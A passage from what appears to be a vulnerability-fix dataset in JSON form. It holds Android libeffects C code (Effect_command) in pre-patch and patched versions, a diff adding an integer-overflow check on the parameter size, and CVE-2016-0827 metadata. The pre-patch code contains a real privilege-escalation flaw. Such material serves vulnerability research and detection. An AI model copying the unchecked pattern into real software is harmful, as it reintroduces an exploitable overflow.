sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: EFFECT_CMD_ENABLE: ERROR\");\n                return -EINVAL;\n            }\n\n            *(int *)pReplyData = android::Effect_setEnabled(pContext, LVM_TRUE);\n            break;\n\n        case EFFECT_CMD_DISABLE:\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_DISABLE start\");\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: EFFECT_CMD_DISABLE: ERROR\");\n                return -EINVAL;\n            }\n            *(int *)pReplyData = android::Effect_setEnabled(pContext, LVM_FALSE);\n            break;\n\n        case EFFECT_CMD_SET_DEVICE:\n        {\n            ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_DEVICE start\");\n            if (pCmdData   == NULL){\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: EFFECT_CMD_SET_DEVICE: ERROR\");\n                return -EINVAL;\n            }\n\n            uint32_t device = *(uint32_t *)pCmdData;\n\n            if (pContext->EffectType == LVM_BASS_BOOST) {\n                if((device == AUDIO_DEVICE_OUT_SPEAKER) ||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_SCO_CARKIT) ||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_A2DP_SPEAKER)){\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is invalid for LVM_BASS_BOOST %d\",\n                          *(int32_t *)pCmdData);\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE temporary disable LVM_BAS_BOOST\");\n\n                    // If a device doesnt support bassboost the effect must be temporarily disabled\n                    // the effect must still report its original state as this can only be changed\n                    // by the ENABLE/DISABLE command\n\n                    if (pContext->pBundledContext->bBassEnabled == LVM_TRUE) {\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE disable LVM_BASS_BOOST %d\",\n                             *(int32_t *)pCmdData);\n                        android::LvmEffect_disable(pContext);\n                    }\n                    pContext->pBundledContext->bBassTempDisabled = LVM_TRUE;\n                } else {\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is valid for LVM_BASS_BOOST %d\",\n                         *(int32_t *)pCmdData);\n\n                    // If a device supports bassboost and the effect has been temporarily disabled\n                    // previously then re-enable it\n\n                    if (pContext->pBundledContext->bBassEnabled == LVM_TRUE) {\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE re-enable LVM_BASS_BOOST %d\",\n                             *(int32_t *)pCmdData);\n                        android::LvmEffect_enable(pContext);\n                    }\n                    pContext->pBundledContext->bBassTempDisabled = LVM_FALSE;\n                }\n            }\n            if (pContext->EffectType == LVM_VIRTUALIZER) {\n                if((device == AUDIO_DEVICE_OUT_SPEAKER)||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_SCO_CARKIT)||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_A2DP_SPEAKER)){\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is invalid for LVM_VIRTUALIZER %d\",\n                          *(int32_t *)pCmdData);\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE temporary disable LVM_VIRTUALIZER\");\n\n                    //If a device doesnt support virtualizer the effect must be temporarily disabled\n                    // the effect must still report its original state as this can only be changed\n                    // by the ENABLE/DISABLE command\n\n                    if (pContext->pBundledContext->bVirtualizerEnabled == LVM_TRUE) {\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE disable LVM_VIRTUALIZER %d\",\n                              *(int32_t *)pCmdData);\n                        android::LvmEffect_disable(pContext);\n                    }\n                    pContext->pBundledContext->bVirtualizerTempDisabled = LVM_TRUE;\n                } else {\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is valid for LVM_VIRTUALIZER %d\",\n                          *(int32_t *)pCmdData);\n\n                    // If a device supports virtualizer and the effect has been temporarily disabled\n                    // previously then re-enable it\n\n                    if(pContext->pBundledContext->bVirtualizerEnabled == LVM_TRUE){\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE re-enable LVM_VIRTUALIZER %d\",\n                              *(int32_t *)pCmdData);\n                        android::LvmEffect_enable(pContext);\n                    }\n                    pContext->pBundledContext->bVirtualizerTempDisabled = LVM_FALSE;\n                }\n            }\n            ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_DEVICE end\");\n            break;\n        }\n        case EFFECT_CMD_SET_VOLUME:\n        {\n            uint32_t leftVolume, rightVolume;\n            int16_t  leftdB, rightdB;\n            int16_t  maxdB, pandB;\n            int32_t  vol_ret[2] = {1<<24,1<<24}; // Apply no volume\n            int      status = 0;\n            LVM_ControlParams_t     ActiveParams;           /* Current control Parameters */\n            LVM_ReturnStatus_en     LvmStatus=LVM_SUCCESS;  /* Function call status */\n\n            // if pReplyData is NULL, VOL_CTRL is delegated to another effect\n            if(pReplyData == LVM_NULL){\n                break;\n            }\n\n            if (pCmdData == NULL || cmdSize != 2 * sizeof(uint32_t) || pReplyData == NULL ||\n                    replySize == NULL || *replySize < 2*sizeof(int32_t)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_VOLUME: ERROR\");\n                return -EINVAL;\n            }\n\n            leftVolume  = ((*(uint32_t *)pCmdData));\n            rightVolume = ((*((uint32_t *)pCmdData + 1)));\n\n            if(leftVolume == 0x1000000){\n                leftVolume -= 1;\n            }\n            if(rightVolume == 0x1000000){\n                rightVolume -= 1;\n            }\n\n            // Convert volume to dB\n            leftdB  = android::LVC_Convert_VolToDb(leftVolume);\n            rightdB = android::LVC_Convert_VolToDb(rightVolume);\n\n            pandB = rightdB - leftdB;\n\n            // Calculate max volume in dB\n            maxdB = leftdB;\n            if(rightdB > maxdB){\n                maxdB = rightdB;\n            }\n            //ALOGV(\"\\tEFFECT_CMD_SET_VOLUME Session: %d, SessionID: %d VOLUME is %d dB (%d), \"\n            //      \"effect is %d\",\n            //pContext->pBundledContext->SessionNo, pContext->pBundledContext->SessionId,\n            //(int32_t)maxdB, maxVol<<7, pContext->EffectType);\n            //ALOGV(\"\\tEFFECT_CMD_SET_VOLUME: Left is %d, Right is %d\", leftVolume, rightVolume);\n            //ALOGV(\"\\tEFFECT_CMD_SET_VOLUME: Left %ddB, Right %ddB, Position %ddB\",\n            //        leftdB, rightdB, pandB);\n\n            memcpy(pReplyData, vol_ret, sizeof(int32_t)*2);\n            android::VolumeSetVolumeLevel(pContext, (int16_t)(maxdB*100));\n\n            /* Get the current settings */\n            LvmStatus =LVM_GetControlParameters(pContext->pBundledContext->hInstance,&ActiveParams);\n            LVM_ERROR_CHECK(LvmStatus, \"LVM_GetControlParameters\", \"VolumeSetStereoPosition\")\n            if(LvmStatus != LVM_SUCCESS) return -EINVAL;\n\n            /* Volume parameters */\n            ActiveParams.VC_Balance  = pandB;\n            ALOGV(\"\\t\\tVolumeSetStereoPosition() (-96dB -> +96dB)-> %d\\n\", ActiveParams.VC_Balance );\n\n            /* Activate the initial settings */\n            LvmStatus =LVM_SetControlParameters(pContext->pBundledContext->hInstance,&ActiveParams);\n            LVM_ERROR_CHECK(LvmStatus, \"LVM_SetControlParameters\", \"VolumeSetStereoPosition\")\n            if(LvmStatus != LVM_SUCCESS) return -EINVAL;\n            break;\n         }\n        case EFFECT_CMD_SET_AUDIO_MODE:\n            break;\n        default:\n            return -EINVAL;\n    }\n\n    //ALOGV(\"\\tEffect_command end...\\n\\n\");\n    return 0;\n}",
        "func": "int Effect_command(effect_handle_t  self,\n                              uint32_t            cmdCode,\n                              uint32_t            cmdSize,\n                              void                *pCmdData,\n                              uint32_t            *replySize,\n                              void                *pReplyData){\n    EffectContext * pContext = (EffectContext *) self;\n    int retsize;\n\n    //ALOGV(\"\\t\\nEffect_command start\");\n\n    if(pContext->EffectType == LVM_BASS_BOOST){\n        //ALOGV(\"\\tEffect_command setting command for LVM_BASS_BOOST\");\n    }\n    if(pContext->EffectType == LVM_VIRTUALIZER){\n        //ALOGV(\"\\tEffect_command setting command for LVM_VIRTUALIZER\");\n    }\n    if(pContext->EffectType == LVM_EQUALIZER){\n        //ALOGV(\"\\tEffect_command setting command for LVM_EQUALIZER\");\n    }\n    if(pContext->EffectType == LVM_VOLUME){\n        //ALOGV(\"\\tEffect_command setting command for LVM_VOLUME\");\n    }\n\n    if (pContext == NULL){\n        ALOGV(\"\\tLVM_ERROR : Effect_command ERROR pContext == NULL\");\n        return -EINVAL;\n    }\n\n    //ALOGV(\"\\tEffect_command INPUTS are: command %d cmdSize %d\",cmdCode, cmdSize);\n\n    // Incase we disable an effect, next time process is\n    // called the number of effect called could be greater\n    // pContext->pBundledContext->NumberEffectsCalled = 0;\n\n    //ALOGV(\"\\tEffect_command NumberEffectsCalled = %d, NumberEffectsEnabled = %d\",\n    //        pContext->pBundledContext->NumberEffectsCalled,\n    //        pContext->pBundledContext->NumberEffectsEnabled);\n\n    switch (cmdCode){\n        case EFFECT_CMD_INIT:\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR, EFFECT_CMD_INIT: ERROR for effect type %d\",\n                        pContext->EffectType);\n                return -EINVAL;\n            }\n            *(int *) pReplyData = 0;\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT start\");\n            if(pContext->EffectType == LVM_BASS_BOOST){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_BASS_BOOST\");\n                android::BassSetStrength(pContext, 0);\n            }\n            if(pContext->EffectType == LVM_VIRTUALIZER){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_VIRTUALIZER\");\n                android::VirtualizerSetStrength(pContext, 0);\n            }\n            if(pContext->EffectType == LVM_EQUALIZER){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_EQUALIZER\");\n                android::EqualizerSetPreset(pContext, 0);\n            }\n            if(pContext->EffectType == LVM_VOLUME){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_VOLUME\");\n                *(int *) pReplyData = android::VolumeSetVolumeLevel(pContext, 0);\n            }\n            break;\n\n        case EFFECT_CMD_SET_CONFIG:\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_CONFIG start\");\n            if (pCmdData    == NULL || cmdSize     != sizeof(effect_config_t) ||\n                    pReplyData  == NULL || replySize == NULL || *replySize  != sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n            *(int *) pReplyData = android::Effect_setConfig(pContext, (effect_config_t *) pCmdData);\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_CONFIG end\");\n            break;\n\n        case EFFECT_CMD_GET_CONFIG:\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(effect_config_t)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: \"\n                        \"EFFECT_CMD_GET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n\n            android::Effect_getConfig(pContext, (effect_config_t *)pReplyData);\n            break;\n\n        case EFFECT_CMD_RESET:\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_RESET start\");\n            android::Effect_setConfig(pContext, &pContext->config);\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_RESET end\");\n            break;\n\n        case EFFECT_CMD_GET_PARAM:{\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_GET_PARAM start\");\n\n            effect_param_t *p = (effect_param_t *)pCmdData;\n            if (SIZE_MAX - sizeof(effect_param_t) < (size_t)p->psize) {\n                android_errorWriteLog(0x534e4554, \"26347509\");\n                return -EINVAL;\n            }\n            if (pCmdData == NULL || cmdSize < sizeof(effect_param_t) ||\n                    cmdSize < (sizeof(effect_param_t) + p->psize) ||\n                    pReplyData == NULL || replySize == NULL ||\n                    *replySize < (sizeof(effect_param_t) + p->psize)) {\n                ALOGV(\"\\tLVM_ERROR : EFFECT_CMD_GET_PARAM: ERROR\");\n                return -EINVAL;\n            }\n\n            memcpy(pReplyData, pCmdData, sizeof(effect_param_t) + p->psize);\n\n            p = (effect_param_t *)pReplyData;\n\n            int voffset = ((p->psize - 1) / sizeof(int32_t) + 1) * sizeof(int32_t);\n\n            if(pContext->EffectType == LVM_BASS_BOOST){\n                p->status = android::BassBoost_getParameter(pContext,\n                                                            p->data,\n                                                            (size_t  *)&p->vsize,\n                                                            p->data + voffset);\n                //ALOGV(\"\\tBassBoost_command EFFECT_CMD_GET_PARAM \"\n                //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n            }\n\n            if(pContext->EffectType == LVM_VIRTUALIZER){\n                p->status = android::Virtualizer_getParameter(pContext,\n                                                             (void *)p->data,\n                                                             (size_t  *)&p->vsize,\n                                                              p->data + voffset);\n\n                //ALOGV(\"\\tVirtualizer_command EFFECT_CMD_GET_PARAM \"\n                //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n            }\n            if(pContext->EffectType == LVM_EQUALIZER){\n                //ALOGV(\"\\tEqualizer_command cmdCode Case: \"\n                //        \"EFFECT_CMD_GET_PARAM start\");\n                p->status = android::Equalizer_getParameter(pContext,\n                                                            p->data,\n                                                            &p->vsize,\n                                                            p->data + voffset);\n\n                //ALOGV(\"\\tEqualizer_command EFFECT_CMD_GET_PARAM *pCmdData %d, *replySize %d, \"\n                //       \"*pReplyData %08x %08x\",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)), *replySize,\n                //        *(int32_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset),\n                //        *(int32_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset +\n                //        sizeof(int32_t)));\n            }\n            if(pContext->EffectType == LVM_VOLUME){\n                //ALOGV(\"\\tVolume_command cmdCode Case: EFFECT_CMD_GET_PARAM start\");\n                p->status = android::Volume_getParameter(pContext,\n                                                         (void *)p->data,\n                                                         (size_t  *)&p->vsize,\n                                                         p->data + voffset);\n\n                //ALOGV(\"\\tVolume_command EFFECT_CMD_GET_PARAM \"\n                //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n            }\n            *replySize = sizeof(effect_param_t) + voffset + p->vsize;\n\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_GET_PARAM end\");\n        } break;\n        case EFFECT_CMD_SET_PARAM:{\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_PARAM start\");\n            if(pContext->EffectType == LVM_BASS_BOOST){\n                //ALOGV(\"\\tBassBoost_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d\",\n                //       *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //       *replySize,\n                //       *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n                if (pCmdData   == NULL ||\n                        cmdSize    != (sizeof(effect_param_t) + sizeof(int32_t) +sizeof(int16_t)) ||\n                        pReplyData == NULL || replySize == NULL || *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : BassBoost_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                if (p->psize != sizeof(int32_t)){\n                    ALOGV(\"\\tLVM_ERROR : BassBoost_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR, psize is not sizeof(int32_t)\");\n                    return -EINVAL;\n                }\n\n                //ALOGV(\"\\tnBassBoost_command cmdSize is %d\\n\"\n                //        \"\\tsizeof(effect_param_t) is  %d\\n\"\n                //        \"\\tp->psize is %d\\n\"\n                //        \"\\tp->vsize is %d\"\n                //        \"\\n\",\n                //        cmdSize, sizeof(effect_param_t), p->psize, p->vsize );\n\n                *(int *)pReplyData = android::BassBoost_setParameter(pContext,\n                                                                    (void *)p->data,\n                                                                    p->data + p->psize);\n            }\n            if(pContext->EffectType == LVM_VIRTUALIZER){\n              //ALOGV(\"\\tVirtualizer_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d\",\n              //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n              //        *replySize,\n              //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n                if (pCmdData   == NULL ||\n                        // legal parameters are int16_t or int32_t\n                        cmdSize    > (sizeof(effect_param_t) + sizeof(int32_t) +sizeof(int32_t)) ||\n                        cmdSize    < (sizeof(effect_param_t) + sizeof(int32_t) +sizeof(int16_t)) ||\n                        pReplyData == NULL || replySize == NULL || *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : Virtualizer_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                if (p->psize != sizeof(int32_t)){\n                    ALOGV(\"\\tLVM_ERROR : Virtualizer_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR, psize is not sizeof(int32_t)\");\n                    return -EINVAL;\n                }\n\n                //ALOGV(\"\\tnVirtualizer_command cmdSize is %d\\n\"\n                //        \"\\tsizeof(effect_param_t) is  %d\\n\"\n                //        \"\\tp->psize is %d\\n\"\n                //        \"\\tp->vsize is %d\"\n                //        \"\\n\",\n                //        cmdSize, sizeof(effect_param_t), p->psize, p->vsize );\n\n                *(int *)pReplyData = android::Virtualizer_setParameter(pContext,\n                                                                      (void *)p->data,\n                                                                       p->data + p->psize);\n            }\n            if(pContext->EffectType == LVM_EQUALIZER){\n               //ALOGV(\"\\tEqualizer_command cmdCode Case: \"\n               //        \"EFFECT_CMD_SET_PARAM start\");\n               //ALOGV(\"\\tEqualizer_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d \",\n               //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n               //        *replySize,\n               //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n                if (pCmdData == NULL || cmdSize < (sizeof(effect_param_t) + sizeof(int32_t)) ||\n                        pReplyData == NULL || replySize == NULL || *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : Equalizer_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                *(int *)pReplyData = android::Equalizer_setParameter(pContext,\n                                                                    (void *)p->data,\n                                                                     p->data + p->psize);\n            }\n            if(pContext->EffectType == LVM_VOLUME){\n                //ALOGV(\"\\tVolume_command cmdCode Case: EFFECT_CMD_SET_PARAM start\");\n                //ALOGV(\"\\tVolume_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) +sizeof(int32_t)));\n\n                if (pCmdData   == NULL ||\n                        cmdSize    < (sizeof(effect_param_t) + sizeof(int32_t)) ||\n                        pReplyData == NULL || replySize == NULL ||\n                        *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : Volume_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                *(int *)pReplyData = android::Volume_setParameter(pContext,\n                                                                 (void *)p->data,\n                                                                 p->data + p->psize);\n            }\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_PARAM end\");\n        } break;\n\n        case EFFECT_CMD_ENABLE:\n            ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_ENABLE start\");\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: EFFECT_CMD_ENABLE: ERROR\");\n                return -EINVAL;\n            }\n\n            *(int *)pReplyData = android::Effect_setEnabled(pContext, LVM_TRUE);\n            break;\n\n        case EFFECT_CMD_DISABLE:\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_DISABLE start\");\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: EFFECT_CMD_DISABLE: ERROR\");\n                return -EINVAL;\n            }\n            *(int *)pReplyData = android::Effect_setEnabled(pContext, LVM_FALSE);\n            break;\n\n        case EFFECT_CMD_SET_DEVICE:\n        {\n            ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_DEVICE start\");\n            if (pCmdData   == NULL){\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: EFFECT_CMD_SET_DEVICE: ERROR\");\n                return -EINVAL;\n            }\n\n            uint32_t device = *(uint32_t *)pCmdData;\n\n            if (pContext->EffectType == LVM_BASS_BOOST) {\n                if((device == AUDIO_DEVICE_OUT_SPEAKER) ||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_SCO_CARKIT) ||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_A2DP_SPEAKER)){\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is invalid for LVM_BASS_BOOST %d\",\n                          *(int32_t *)pCmdData);\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE temporary disable LVM_BAS_BOOST\");\n\n                    // If a device doesnt support bassboost the effect must be temporarily disabled\n                    // the effect must still report its original state as this can only be changed\n                    // by the ENABLE/DISABLE command\n\n                    if (pContext->pBundledContext->bBassEnabled == LVM_TRUE) {\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE disable LVM_BASS_BOOST %d\",\n                             *(int32_t *)pCmdData);\n                        android::LvmEffect_disable(pContext);\n                    }\n                    pContext->pBundledContext->bBassTempDisabled = LVM_TRUE;\n                } else {\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is valid for LVM_BASS_BOOST %d\",\n                         *(int32_t *)pCmdData);\n\n                    // If a device supports bassboost and the effect has been temporarily disabled\n                    // previously then re-enable it\n\n                    if (pContext->pBundledContext->bBassEnabled == LVM_TRUE) {\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE re-enable LVM_BASS_BOOST %d\",\n                             *(int32_t *)pCmdData);\n                        android::LvmEffect_enable(pContext);\n                    }\n                    pContext->pBundledContext->bBassTempDisabled = LVM_FALSE;\n                }\n            }\n            if (pContext->EffectType == LVM_VIRTUALIZER) {\n                if((device == AUDIO_DEVICE_OUT_SPEAKER)||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_SCO_CARKIT)||\n                        (device == AUDIO_DEVICE_OUT_BLUETOOTH_A2DP_SPEAKER)){\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is invalid for LVM_VIRTUALIZER %d\",\n                          *(int32_t *)pCmdData);\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE temporary disable LVM_VIRTUALIZER\");\n\n                    //If a device doesnt support virtualizer the effect must be temporarily disabled\n                    // the effect must still report its original state as this can only be changed\n                    // by the ENABLE/DISABLE command\n\n                    if (pContext->pBundledContext->bVirtualizerEnabled == LVM_TRUE) {\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE disable LVM_VIRTUALIZER %d\",\n                              *(int32_t *)pCmdData);\n                        android::LvmEffect_disable(pContext);\n                    }\n                    pContext->pBundledContext->bVirtualizerTempDisabled = LVM_TRUE;\n                } else {\n                    ALOGV(\"\\tEFFECT_CMD_SET_DEVICE device is valid for LVM_VIRTUALIZER %d\",\n                          *(int32_t *)pCmdData);\n\n                    // If a device supports virtualizer and the effect has been temporarily disabled\n                    // previously then re-enable it\n\n                    if(pContext->pBundledContext->bVirtualizerEnabled == LVM_TRUE){\n                        ALOGV(\"\\tEFFECT_CMD_SET_DEVICE re-enable LVM_VIRTUALIZER %d\",\n                              *(int32_t *)pCmdData);\n                        android::LvmEffect_enable(pContext);\n                    }\n                    pContext->pBundledContext->bVirtualizerTempDisabled = LVM_FALSE;\n                }\n            }\n            ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_DEVICE end\");\n            break;\n        }\n        case EFFECT_CMD_SET_VOLUME:\n        {\n            uint32_t leftVolume, rightVolume;\n            int16_t  leftdB, rightdB;\n            int16_t  maxdB, pandB;\n            int32_t  vol_ret[2] = {1<<24,1<<24}; // Apply no volume\n            int      status = 0;\n            LVM_ControlParams_t     ActiveParams;           /* Current control Parameters */\n            LVM_ReturnStatus_en     LvmStatus=LVM_SUCCESS;  /* Function call status */\n\n            // if pReplyData is NULL, VOL_CTRL is delegated to another effect\n            if(pReplyData == LVM_NULL){\n                break;\n            }\n\n            if (pCmdData == NULL || cmdSize != 2 * sizeof(uint32_t) || pReplyData == NULL ||\n                    replySize == NULL || *replySize < 2*sizeof(int32_t)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_VOLUME: ERROR\");\n                return -EINVAL;\n            }\n\n            leftVolume  = ((*(uint32_t *)pCmdData));\n            rightVolume = ((*((uint32_t *)pCmdData + 1)));\n\n            if(leftVolume == 0x1000000){\n                leftVolume -= 1;\n            }\n            if(rightVolume == 0x1000000){\n                rightVolume -= 1;\n            }\n\n            // Convert volume to dB\n            leftdB  = android::LVC_Convert_VolToDb(leftVolume);\n            rightdB = android::LVC_Convert_VolToDb(rightVolume);\n\n            pandB = rightdB - leftdB;\n\n            // Calculate max volume in dB\n            maxdB = leftdB;\n            if(rightdB > maxdB){\n                maxdB = rightdB;\n            }\n            //ALOGV(\"\\tEFFECT_CMD_SET_VOLUME Session: %d, SessionID: %d VOLUME is %d dB (%d), \"\n            //      \"effect is %d\",\n            //pContext->pBundledContext->SessionNo, pContext->pBundledContext->SessionId,\n            //(int32_t)maxdB, maxVol<<7, pContext->EffectType);\n            //ALOGV(\"\\tEFFECT_CMD_SET_VOLUME: Left is %d, Right is %d\", leftVolume, rightVolume);\n            //ALOGV(\"\\tEFFECT_CMD_SET_VOLUME: Left %ddB, Right %ddB, Position %ddB\",\n            //        leftdB, rightdB, pandB);\n\n            memcpy(pReplyData, vol_ret, sizeof(int32_t)*2);\n            android::VolumeSetVolumeLevel(pContext, (int16_t)(maxdB*100));\n\n            /* Get the current settings */\n            LvmStatus =LVM_GetControlParameters(pContext->pBundledContext->hInstance,&ActiveParams);\n            LVM_ERROR_CHECK(LvmStatus, \"LVM_GetControlParameters\", \"VolumeSetStereoPosition\")\n            if(LvmStatus != LVM_SUCCESS) return -EINVAL;\n\n            /* Volume parameters */\n            ActiveParams.VC_Balance  = pandB;\n            ALOGV(\"\\t\\tVolumeSetStereoPosition() (-96dB -> +96dB)-> %d\\n\", ActiveParams.VC_Balance );\n\n            /* Activate the initial settings */\n            LvmStatus =LVM_SetControlParameters(pContext->pBundledContext->hInstance,&ActiveParams);\n            LVM_ERROR_CHECK(LvmStatus, \"LVM_SetControlParameters\", \"VolumeSetStereoPosition\")\n            if(LvmStatus != LVM_SUCCESS) return -EINVAL;\n            break;\n         }\n        case EFFECT_CMD_SET_AUDIO_MODE:\n            break;\n        default:\n            return -EINVAL;\n    }\n\n    //ALOGV(\"\\tEffect_command end...\\n\\n\");\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -96,7 +96,10 @@\n             //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_GET_PARAM start\");\n \n             effect_param_t *p = (effect_param_t *)pCmdData;\n-\n+            if (SIZE_MAX - sizeof(effect_param_t) < (size_t)p->psize) {\n+                android_errorWriteLog(0x534e4554, \"26347509\");\n+                return -EINVAL;\n+            }\n             if (pCmdData == NULL || cmdSize < sizeof(effect_param_t) ||\n                     cmdSize < (sizeof(effect_param_t) + p->psize) ||\n                     pReplyData == NULL || replySize == NULL ||",
        "diff_line_info": {
            "deleted_lines": [
                ""
            ],
            "added_lines": [
                "            if (SIZE_MAX - sizeof(effect_param_t) < (size_t)p->psize) {",
                "                android_errorWriteLog(0x534e4554, \"26347509\");",
                "                return -EINVAL;",
                "            }"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-0827",
        "func_name": "android/Reverb_command",
        "description": "Multiple integer overflows in libeffects in mediaserver in Android 4.x before 4.4.4, 5.x before 5.1.1 LMY49H, and 6.x before 2016-03-01 allow attackers to gain privileges via a crafted application, as demonstrated by obtaining Signature or SignatureOrSystem access, related to EffectBundle.cpp and EffectReverb.cpp, aka internal bug 26347509.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/9e29523b9537983b4c4b205ff868d0b3bca0383b",
        "commit_title": "fix possible overflow in effect wrappers.",
